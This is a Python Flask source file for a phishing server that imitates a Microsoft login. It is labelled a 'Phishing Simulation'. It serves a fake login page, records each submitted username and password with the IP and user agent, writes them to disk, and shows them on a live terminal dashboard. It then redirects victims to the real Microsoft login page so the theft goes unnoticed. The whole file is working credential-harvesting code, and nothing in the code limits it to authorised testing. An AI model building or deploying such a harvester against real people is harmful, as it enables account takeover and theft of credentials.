import sys
import time
import threading
from datetime import datetime, timezone

from flask import Flask, request, redirect, render_template
from rich import box
from rich.console import Console
from rich.live import Live
from rich.panel import Panel
from rich.table import Table

from logger import log_submission

app = Flask(__name__)
console = Console()

# ── Thread-safe in-memory capture store ──────────────────────────────────────
_lock: threading.Lock = threading.Lock()
_captures: list[dict] = []

REDIRECT_URLS = {
    "microsoft": "https://login.microsoftonline.com/",
}
DEFAULT_REDIRECT = "https://microsoft.com"


# ── Rich dashboard builders ───────────────────────────────────────────────────

def _build_table() -> Table:
    table = Table(
        box=box.ROUNDED,
        header_style="bold white on red",
        border_style="bright_red",
        show_lines=True,
        expand=True,
    )
    table.add_column("#",               style="dim",        width=4,  justify="right")
    table.add_column("Timestamp (UTC)", style="cyan",       min_width=20)
    table.add_column("IP Address",      style="yellow",     min_width=15)
    table.add_column("Page",            style="green",      min_width=12)
    table.add_column("Username",        style="bold white", min_width=28)

    with _lock:
        rows = list(_captures)

    if not rows:
        table.add_row("—", "[dim]Waiting for captures…[/dim]", "", "", "")
    else:
        for i, entry in enumerate(rows, 1):
            table.add_row(
                str(i),
                entry["timestamp"],
                entry["ip"],
                entry["page_id"],
                entry["username"],
            )

    return table


def _build_panel() -> Panel:
    with _lock:
        count = len(_captures)

    subtitle = (
        f"[dim]Listening on [bold]0.0.0.0:5000[/bold]  ·  "
        f"Captures: [bold red]{count}[/bold red]  ·  "
        f"Press [bold]Ctrl+C[/bold] to stop[/dim]"
    )
    return Panel(
        _build_table(),
        title="[bold red] ⚠  Phishing Simulation — Live Credential Capture  ⚠ [/bold red]",
        subtitle=subtitle,
        border_style="red",
        padding=(0, 1),
    )


# ── Flask routes ──────────────────────────────────────────────────────────────

@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    ip         = request.headers.get("X-Forwarded-For", request.remote_addr)
    user_agent = request.headers.get("User-Agent", "")
    page_id    = request.form.get("page_id", "unknown")
    username   = request.form.get("username", "")
    password   = request.form.get("password", "")

    # Persist to disk (credentials.json)
    log_submission(
        ip=ip,
        user_agent=user_agent,
        page_id=page_id,
        username=username,
        password=password,
    )

    # Append to in-memory list for the live dashboard
    timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S")
    with _lock:
        _captures.append({
            "timestamp": timestamp,
            "ip":        ip,
            "page_id":   page_id,
            "username":  username,
        })

    redirect_url = REDIRECT_URLS.get(page_id, DEFAULT_REDIRECT)
    return redirect(redirect_url)


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # Run Flask in a background daemon thread so Ctrl-C kills everything cleanly
    flask_thread = threading.Thread(
        target=lambda: app.run(
            host="0.0.0.0",
            port=5000,
            debug=False,
            use_reloader=False,
        ),
        daemon=True,
        name="flask-server",
    )
    flask_thread.start()

    # Rich Live display owns the main thread
    try:
        with Live(_build_panel(), console=console, refresh_per_second=4) as live:
            while True:
                live.update(_build_panel())
                time.sleep(0.25)
    except KeyboardInterrupt:
        console.print("\n[bold red]Server stopped.[/bold red]")
        sys.exit(0)
